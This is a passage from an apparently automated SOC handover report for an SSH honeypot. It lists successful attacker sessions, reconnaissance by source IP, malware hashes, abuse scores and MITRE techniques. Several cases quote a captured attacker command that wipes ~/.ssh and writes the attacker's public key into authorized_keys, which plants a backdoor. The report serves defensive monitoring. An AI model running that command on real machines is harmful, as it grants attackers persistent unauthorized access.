- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70a13ab0200e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:41 |
| **Last Seen** | 2026-04-24 13:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:41:27` | `cowrie.session.connect` |
| `2026-04-24 13:41:27` | `cowrie.client.version` |
| `2026-04-24 13:41:27` | `cowrie.client.kex` |
| `2026-04-24 13:41:28` | `cowrie.login.success` |
| `2026-04-24 13:41:28` | `cowrie.session.params` |
| `2026-04-24 13:41:28` | `cowrie.command.input` |
| `2026-04-24 13:41:28` | `cowrie.command.failed` |
| `2026-04-24 13:41:28` | `cowrie.log.closed` |
| `2026-04-24 13:41:28` | `cowrie.session.params` |
| `2026-04-24 13:41:28` | `cowrie.command.input` |
| `2026-04-24 13:41:28` | `cowrie.session.file_download` |
| `2026-04-24 13:41:28` | `cowrie.log.closed` |
| `2026-04-24 13:41:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-932110ac8e84

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:41 |
| **Last Seen** | 2026-04-24 13:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:41:30` | `cowrie.session.connect` |
| `2026-04-24 13:41:30` | `cowrie.client.version` |
| `2026-04-24 13:41:30` | `cowrie.client.kex` |
| `2026-04-24 13:41:31` | `cowrie.login.success` |
| `2026-04-24 13:41:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ffbf3d9c900

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:42 |
| **Last Seen** | 2026-04-24 13:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:42:24` | `cowrie.session.connect` |
| `2026-04-24 13:42:24` | `cowrie.client.version` |
| `2026-04-24 13:42:24` | `cowrie.client.kex` |
| `2026-04-24 13:42:24` | `cowrie.login.success` |
| `2026-04-24 13:42:25` | `cowrie.session.params` |
| `2026-04-24 13:42:25` | `cowrie.command.input` |
| `2026-04-24 13:42:25` | `cowrie.command.failed` |
| `2026-04-24 13:42:25` | `cowrie.log.closed` |
| `2026-04-24 13:42:25` | `cowrie.session.params` |
| `2026-04-24 13:42:25` | `cowrie.command.input` |
| `2026-04-24 13:42:25` | `cowrie.session.file_download` |
| `2026-04-24 13:42:25` | `cowrie.log.closed` |
| `2026-04-24 13:42:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad15635feed6

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:42 |
| **Last Seen** | 2026-04-24 13:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:42:27` | `cowrie.session.connect` |
| `2026-04-24 13:42:27` | `cowrie.client.version` |
| `2026-04-24 13:42:27` | `cowrie.client.kex` |
| `2026-04-24 13:42:28` | `cowrie.login.success` |
| `2026-04-24 13:42:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-354da31bea9d

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-24 13:42 |
| **Last Seen** | 2026-04-24 13:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:42:35` | `cowrie.session.connect` |
| `2026-04-24 13:42:35` | `cowrie.client.version` |
| `2026-04-24 13:42:36` | `cowrie.client.kex` |
| `2026-04-24 13:42:36` | `cowrie.login.success` |
| `2026-04-24 13:42:36` | `cowrie.session.params` |
| `2026-04-24 13:42:36` | `cowrie.command.input` |
| `2026-04-24 13:42:36` | `cowrie.command.failed` |
| `2026-04-24 13:42:36` | `cowrie.log.closed` |
| `2026-04-24 13:42:37` | `cowrie.session.params` |
| `2026-04-24 13:42:37` | `cowrie.command.input` |
| `2026-04-24 13:42:37` | `cowrie.session.file_download` |
| `2026-04-24 13:42:37` | `cowrie.log.closed` |
| `2026-04-24 13:42:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80726f8d21ce

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-24 13:42 |
| **Last Seen** | 2026-04-24 13:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:42:39` | `cowrie.session.connect` |
| `2026-04-24 13:42:39` | `cowrie.client.version` |
| `2026-04-24 13:42:39` | `cowrie.client.kex` |
| `2026-04-24 13:42:39` | `cowrie.login.success` |
| `2026-04-24 13:42:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cedf1d076778

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:43 |
| **Last Seen** | 2026-04-24 13:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:43:19` | `cowrie.session.connect` |
| `2026-04-24 13:43:19` | `cowrie.client.version` |
| `2026-04-24 13:43:19` | `cowrie.client.kex` |
| `2026-04-24 13:43:19` | `cowrie.login.success` |
| `2026-04-24 13:43:19` | `cowrie.session.params` |
| `2026-04-24 13:43:19` | `cowrie.command.input` |
| `2026-04-24 13:43:19` | `cowrie.command.failed` |
| `2026-04-24 13:43:19` | `cowrie.log.closed` |
| `2026-04-24 13:43:20` | `cowrie.session.params` |
| `2026-04-24 13:43:20` | `cowrie.command.input` |
| `2026-04-24 13:43:20` | `cowrie.session.file_download` |
| `2026-04-24 13:43:20` | `cowrie.log.closed` |
| `2026-04-24 13:43:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e90d572e602

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]177` |
| **First Seen** | 2026-04-24 13:43 |
| **Last Seen** | 2026-04-24 13:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:43:22` | `cowrie.session.connect` |
| `2026-04-24 13:43:22` | `cowrie.client.version` |
| `2026-04-24 13:43:22` | `cowrie.client.kex` |
| `2026-04-24 13:43:22` | `cowrie.login.success` |
| `2026-04-24 13:43:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]177` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c714c9fa207c

| Field | Detail |
|---|---|
| **Source IP** | `103.149.27[.]208` |
| **First Seen** | 2026-04-24 13:43 |
| **Last Seen** | 2026-04-24 13:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 13:43:31` | `cowrie.session.connect` |
| `2026-04-24 13:43:31` | `cowrie.client.version` |
| `2026-04-24 13:43:31` | `cowrie.client.kex` |
| `2026-04-24 13:43:31` | `cowrie.login.success` |
| `2026-04-24 13:43:31` | `cowrie.session.params` |
| `2026-04-24 13:43:31` | `cowrie.command.input` |
| `2026-04-24 13:43:31` | `cowrie.command.failed` |
| `2026-04-24 13:43:32` | `cowrie.log.closed` |
| `2026-04-24 13:43:32` | `cowrie.session.params` |
| `2026-04-24 13:43:32` | `cowrie.command.input` |
| `2026-04-24 13:43:32` | `cowrie.session.file_download` |
| `2026-04-24 13:43:32` | `cowrie.log.closed` |

**Recommended Actions:**
- [ ] Submit `103.149.27[.]208` to AbuseIPDB if not already reported
- [ ] Block `103.149.27[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `106.13.122[.]214` | **27** | 2026-04-24 11:19 | 2026-04-24 11:49 | 40m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `43.128.87[.]215` | **27** | 2026-04-24 11:53 | 2026-04-24 12:44 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.149.27[.]208` | **17** | 2026-04-24 12:51 | 2026-04-24 13:43 | 0m | 17 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `165.154.6[.]177` | **15** | 2026-04-24 13:25 | 2026-04-24 13:43 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.112[.]243` | **9** | 2026-04-24 11:18 | 2026-04-24 11:29 | 16m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.75.224[.]26` | **2** | 2026-04-24 11:34 | 2026-04-24 11:37 | 2m | 0 | `T1592` | 🟢 LOW |
| `120.48.122[.]43` | **2** | 2026-04-24 12:06 | 2026-04-24 12:08 | 2m | 0 | `T1592` | 🟢 LOW |
| `20.65.136[.]10` | **2** | 2026-04-24 12:48 | 2026-04-24 12:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `27.128.171[.]39` | **2** | 2026-04-24 11:49 | 2026-04-24 11:51 | 4m | 0 | `T1592` | 🟢 LOW |
| `106.13.190[.]191` | 1 | 2026-04-24 11:38 | 2026-04-24 11:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.147.40[.]93` | 1 | 2026-04-24 12:53 | 2026-04-24 12:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.114.69[.]235` | 1 | 2026-04-24 12:55 | 2026-04-24 12:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]25` | 1 | 2026-04-24 11:22 | 2026-04-24 11:22 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `209.38.69[.]153` | 1 | 2026-04-24 13:36 | 2026-04-24 13:36 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `213.91.178[.]109` | 1 | 2026-04-24 11:27 | 2026-04-24 11:27 | 30s | 0 | `T1592` | 🟢 LOW |
| `54.221.116[.]122` | 1 | 2026-04-24 12:57 | 2026-04-24 12:57 | 1s | 0 | `T1592` | 🟢 LOW |
| `87.106.35[.]227` | 1 | 2026-04-24 11:29 | 2026-04-24 11:29 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `54.221.116[.]122` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 12 |
| `43.128.87[.]215` | SG | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 2 |
| `213.91.178[.]109` | BG | Vivacom Bulgaria EAD | **100** ⚠️ | 19 |
| `165.154.6[.]177` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 4 |
| `101.75.224[.]26` | CN | China Unicom Hebei province network | **100** ⚠️ | 24 |
| `209.38.69[.]153` | US | DigitalOcean, LLC | **100** ⚠️ | 15 |
| `106.13.190[.]191` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 6 |
| `87.106.35[.]227` | GB | IONOS SE | **100** ⚠️ | 50 |
| `103.149.27[.]208` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `14.103.112[.]243` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 169 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 67 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 64 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 34 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 34 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 1 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 179 cases |
| Tool 34  | Credential Extractor        | ✅ 131 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 20 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (2.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 12 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 64 priority case(s) shown individually · 17 recon entry/entries in table (9 group(s) consolidating 103 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-24T13:44:39Z_
